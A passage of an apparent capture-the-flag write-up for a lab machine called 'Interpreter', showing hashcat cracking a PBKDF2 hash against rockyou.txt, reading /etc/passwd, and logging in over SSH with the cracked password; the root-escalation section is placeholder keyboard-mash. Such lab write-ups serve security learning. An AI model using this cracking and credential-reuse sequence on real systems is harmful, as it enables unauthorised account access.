+<span class="n">Restore</span><span class="o">.</span><span class="n">Sub</span><span class="o">.</span><span class="c1">#01..: Salt:0 Amplifier:0-1 Iteration:354000-355000</span>
+<span class="n">Candidate</span><span class="o">.</span><span class="n">Engine</span><span class="o">.</span><span class="p">:</span> <span class="n">Device</span> <span class="n">Generator</span>
+<span class="n">Candidates</span><span class="o">.</span><span class="c1">#01...: cedric -&gt; hottie101</span>
+<span class="n">Hardware</span><span class="o">.</span><span class="n">Mon</span><span class="o">.</span><span class="c1">#01.: Util: 83%</span>
+
+<span class="n">sha256</span><span class="p">:</span><span class="mi">600000</span><span class="p">:</span><span class="n">u</span><span class="o">/+</span><span class="n">LBBOUnac</span><span class="o">=</span><span class="p">:</span><span class="n">YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps</span><span class="o">=</span><span class="p">:</span><span class="n">snowflake1</span>
+
+<span class="n">Session</span><span class="o">..........</span><span class="p">:</span> <span class="n">hashcat</span>
+<span class="n">Status</span><span class="o">...........</span><span class="p">:</span> <span class="n">Cracked</span>
+<span class="n">Hash</span><span class="o">.</span><span class="n">Mode</span><span class="o">........</span><span class="p">:</span> <span class="mi">10900</span> <span class="p">(</span><span class="n">PBKDF2</span><span class="o">-</span><span class="n">HMAC</span><span class="o">-</span><span class="n">SHA256</span><span class="p">)</span>
+<span class="n">Hash</span><span class="o">.</span><span class="n">Target</span><span class="o">......</span><span class="p">:</span> <span class="n">sha256</span><span class="p">:</span><span class="mi">600000</span><span class="p">:</span><span class="n">u</span><span class="o">/+</span><span class="n">LBBOUnac</span><span class="o">=</span><span class="p">:</span><span class="n">YshQbDDqCAzy21EdK5OfZBJD</span><span class="o">...</span><span class="n">Ld8Ps</span><span class="o">=</span>
+<span class="n">Time</span><span class="o">.</span><span class="n">Started</span><span class="o">.....</span><span class="p">:</span> <span class="n">Sat</span> <span class="n">Feb</span> <span class="mi">21</span> <span class="mi">18</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">42</span> <span class="mi">2026</span> <span class="p">(</span><span class="mi">1</span> <span class="nb">min</span><span class="p">,</span> <span class="mi">21</span> <span class="n">secs</span><span class="p">)</span>
+<span class="n">Time</span><span class="o">.</span><span class="n">Estimated</span><span class="o">...</span><span class="p">:</span> <span class="n">Sat</span> <span class="n">Feb</span> <span class="mi">21</span> <span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">03</span> <span class="mi">2026</span> <span class="p">(</span><span class="mi">0</span> <span class="n">secs</span><span class="p">)</span>
+<span class="n">Kernel</span><span class="o">.</span><span class="n">Feature</span><span class="o">...</span><span class="p">:</span> <span class="n">Pure</span> <span class="n">Kernel</span> <span class="p">(</span><span class="n">password</span> <span class="n">length</span> <span class="mi">0</span><span class="o">-</span><span class="mi">256</span> <span class="nb">bytes</span><span class="p">)</span>
+<span class="n">Guess</span><span class="o">.</span><span class="n">Base</span><span class="o">.......</span><span class="p">:</span> <span class="n">File</span> <span class="p">(</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span><span class="p">)</span>
+<span class="n">Guess</span><span class="o">.</span><span class="n">Queue</span><span class="o">......</span><span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">1</span> <span class="p">(</span><span class="mf">100.00</span><span class="o">%</span><span class="p">)</span>
+<span class="n">Speed</span><span class="o">.</span><span class="c1">#01........:      125 H/s (13.16ms) @ Accel:70 Loops:1000 Thr:1 Vec:8</span>
+<span class="n">Recovered</span><span class="o">........</span><span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">1</span> <span class="p">(</span><span class="mf">100.00</span><span class="o">%</span><span class="p">)</span> <span class="n">Digests</span> <span class="p">(</span><span class="n">total</span><span class="p">),</span> <span class="mi">1</span><span class="o">/</span><span class="mi">1</span> <span class="p">(</span><span class="mf">100.00</span><span class="o">%</span><span class="p">)</span> <span class="n">Digests</span> <span class="p">(</span><span class="n">new</span><span class="p">)</span>
+<span class="n">Progress</span><span class="o">.........</span><span class="p">:</span> <span class="mi">10080</span><span class="o">/</span><span class="mi">14344385</span> <span class="p">(</span><span class="mf">0.07</span><span class="o">%</span><span class="p">)</span>
+<span class="n">Rejected</span><span class="o">.........</span><span class="p">:</span> <span class="mi">0</span><span class="o">/</span><span class="mi">10080</span> <span class="p">(</span><span class="mf">0.00</span><span class="o">%</span><span class="p">)</span>
+<span class="n">Restore</span><span class="o">.</span><span class="n">Point</span><span class="o">....</span><span class="p">:</span> <span class="mi">8960</span><span class="o">/</span><span class="mi">14344385</span> <span class="p">(</span><span class="mf">0.06</span><span class="o">%</span><span class="p">)</span>
+<span class="n">Restore</span><span class="o">.</span><span class="n">Sub</span><span class="o">.</span><span class="c1">#01..: Salt:0 Amplifier:0-1 Iteration:599000-599999</span>
+<span class="n">Candidate</span><span class="o">.</span><span class="n">Engine</span><span class="o">.</span><span class="p">:</span> <span class="n">Device</span> <span class="n">Generator</span>
+<span class="n">Candidates</span><span class="o">.</span><span class="c1">#01...: 010106 -&gt; clarke</span>
+<span class="n">Hardware</span><span class="o">.</span><span class="n">Mon</span><span class="o">.</span><span class="c1">#01.: Util: 84%</span>
+
+<span class="n">Started</span><span class="p">:</span> <span class="n">Sat</span> <span class="n">Feb</span> <span class="mi">21</span> <span class="mi">18</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">40</span> <span class="mi">2026</span>
+<span class="n">Stopped</span><span class="p">:</span> <span class="n">Sat</span> <span class="n">Feb</span> <span class="mi">21</span> <span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">04</span> <span class="mi">2026</span>
+</code></pre></div>
+<p>Creds:</p>
+<div class="highlight"><pre><span></span><code><span class="p">:</span><span class="n">snowflake1</span>
+
+<span class="n">mirth</span><span class="nd">@interpreter</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">mirthconnect</span><span class="o">/</span><span class="n">conf</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">bash</span>
+<span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="n">sedric</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="n">sedric</span><span class="p">,,,:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">sedric</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+</code></pre></div>
+<h2 id="privilege-escalation-to-user-sedric">Privilege Escalation to User sedric</h2>
+<h3 id="system-enumeration">System Enumeration</h3>
+<div class="highlight"><pre><span></span><code><span class="n">mirth</span><span class="nd">@interpreter</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">mirthconnect</span><span class="o">/</span><span class="n">conf</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span> <span class="o">/</span><span class="n">home</span>
+<span class="n">total</span> <span class="mi">12</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">3</span> <span class="n">root</span>   <span class="n">root</span>   <span class="mi">4096</span> <span class="n">Aug</span>  <span class="mi">7</span>  <span class="mi">2025</span> <span class="o">.</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">19</span> <span class="n">root</span>   <span class="n">root</span>   <span class="mi">4096</span> <span class="n">Feb</span> <span class="mi">16</span> <span class="mi">15</span><span class="p">:</span><span class="mi">42</span> <span class="o">..</span>
+<span class="n">drwx</span><span class="o">------</span>  <span class="mi">3</span> <span class="n">sedric</span> <span class="n">sedric</span> <span class="mi">4096</span> <span class="n">Feb</span> <span class="mi">12</span> <span class="mi">08</span><span class="p">:</span><span class="mi">46</span> <span class="n">sedric</span>
+
+<span class="n">mirth</span><span class="nd">@interpreter</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">mirthconnect</span><span class="o">/</span><span class="n">conf</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">bashc</span>
+<span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="n">sedric</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="n">sedric</span><span class="p">,,,:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">sedric</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+</code></pre></div>
+<h3 id="ssh">SSH</h3>
+<div class="highlight"><pre><span></span><code><span class="n">ssh</span> <span class="n">sedric</span><span class="o">@</span><span class="mf">10.129.1.109</span>
+<span class="n">The</span> <span class="n">authenticity</span> <span class="n">of</span> <span class="n">host</span> <span class="s1">&#39;10.129.1.109 (10.129.1.109)&#39;</span> <span class="n">can</span><span class="s1">&#39;t be established.</span>
+<span class="n">ED25519</span> <span class="n">key</span> <span class="n">fingerprint</span> <span class="ow">is</span><span class="p">:</span> <span class="n">SHA256</span><span class="p">:</span><span class="n">Oz7Fk6YvrB8</span><span class="o">/</span><span class="mi">5</span><span class="n">uSyuoY</span><span class="o">+</span><span class="n">mqLefkwpPaepkXAppxIX0xk</span>
+<span class="n">This</span> <span class="n">host</span> <span class="n">key</span> <span class="ow">is</span> <span class="n">known</span> <span class="n">by</span> <span class="n">the</span> <span class="n">following</span> <span class="n">other</span> <span class="n">names</span><span class="o">/</span><span class="n">addresses</span><span class="p">:</span>
+    <span class="o">~/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">known_hosts</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span> <span class="p">[</span><span class="n">hashed</span> <span class="n">name</span><span class="p">]</span>
+<span class="n">Are</span> <span class="n">you</span> <span class="n">sure</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="k">continue</span> <span class="n">connecting</span> <span class="p">(</span><span class="n">yes</span><span class="o">/</span><span class="n">no</span><span class="o">/</span><span class="p">[</span><span class="n">fingerprint</span><span class="p">])</span><span class="err">?</span> <span class="n">yes</span>
+<span class="ne">Warning</span><span class="p">:</span> <span class="n">Permanently</span> <span class="n">added</span> <span class="s1">&#39;10.129.1.109&#39;</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span> <span class="n">to</span> <span class="n">the</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">known</span> <span class="n">hosts</span><span class="o">.</span>
+<span class="n">sedric</span><span class="o">@</span><span class="mf">10.129.1.109</span><span class="s1">&#39;s password: snowflake1</span>
+<span class="n">Linux</span> <span class="n">interpreter</span> <span class="mf">6.1.0</span><span class="o">-</span><span class="mi">43</span><span class="o">-</span><span class="n">amd64</span> <span class="c1">#1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64</span>
+<span class="n">The</span> <span class="n">programs</span> <span class="n">included</span> <span class="k">with</span> <span class="n">the</span> <span class="n">Debian</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="n">system</span> <span class="n">are</span> <span class="n">free</span> <span class="n">software</span><span class="p">;</span>
+<span class="n">the</span> <span class="n">exact</span> <span class="n">distribution</span> <span class="n">terms</span> <span class="k">for</span> <span class="n">each</span> <span class="n">program</span> <span class="n">are</span> <span class="n">described</span> <span class="ow">in</span> <span class="n">the</span>
+<span class="n">individual</span> <span class="n">files</span> <span class="ow">in</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/*/</span><span class="n">copyright</span><span class="o">.</span>
+
+<span class="n">Debian</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="n">comes</span> <span class="k">with</span> <span class="n">ABSOLUTELY</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span>
+<span class="n">permitted</span> <span class="n">by</span> <span class="n">applicable</span> <span class="n">law</span><span class="o">.</span>
+<span class="n">Last</span> <span class="n">login</span><span class="p">:</span> <span class="n">Sat</span> <span class="n">Feb</span> <span class="mi">21</span> <span class="mi">18</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">59</span> <span class="mi">2026</span> <span class="kn">from</span> <span class="mf">10.10.14.30</span>
+<span class="n">sedric</span><span class="nd">@interpreter</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</code></pre></div>
+<h2 id="privilege-escalation-to-root">Privilege Escalation to Root</h2>
+<p>fasdfdjaslk</p>
+<p>fsdjklfasjldfasf
+asjfklasfja
+sfjasfj
+asdfjaflkasjdf;lajs</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../../..", "features": ["content.code.copy", "navigation.prune", "navigation.expand", "navigation.top", "navigation.tracking", "navigation.path", "navigation.instant", "content.code.copy", "search.highlight", "search.suggest", "search.highlight", "search.suggest"], "search": "../../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
